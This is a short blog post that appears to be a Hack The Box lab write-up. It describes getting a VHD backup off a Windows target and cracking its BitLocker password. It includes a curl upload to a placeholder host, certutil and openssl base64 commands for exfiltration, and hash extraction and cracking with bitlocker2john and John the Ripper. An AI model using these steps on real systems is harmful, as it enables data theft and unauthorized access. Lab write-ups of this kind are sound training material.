---
title: "File Exfile on Windows"
date: 2024-04-19
---



# File Exfil from Windows




While practicing on a hack the box machine I came across a VHD backup. Juicy! I thought lets just transerfer it over and crack it. 
Well to my newbie brain I first tried scp but there was no ssh. Shoot lets try ftp, and nope. So what about python? No ruby, no php and no python. 

I tried setting up an upload server to no avail the upload was proxied and was taking ages just for a tiny file. When the file finally downloaded it was corrupted!!! WTF What now? 
```shell
curl -X POST http://HOST/upload -H -F 'files=@file.txt' 
```

Well, using some lolbin techniques I tried certutil but I wasn't able to accsess it.

```shell
certutil -encode data.txt tmp.b64 && findstr /v /c:- tmp.b64 > data.b64
```

Looking around I had priveledged access to openssl!! Looking for a lolbin I used this to finally transfer the VHD over to my attack host!

```shell
openssl base64 -in <infile> -out <outfile>
```


### Mount Windows VHD on attack linux machine
If you've acquired a VHD file try this
#### Unzip VHD
```shell
7z x Backup.vhd 

...SNIP...

'1.partition.img' 
```
#### Extract Hashes
```
bitlocker2john -i '1.partition.img' 
```
#### Create Hash File
```shell
echo '$bitlocker$0$16$...SNIP...4443a' > bitlock
```
#### Crack with JTR
```shell
john --wordlist=pass.list bitlock
```

#### Mount VHD and use cracked Pass
```
sudo modprobe nbd 
sudo qemu-nbd -c /dev/nbd0 Backup.vhd
```
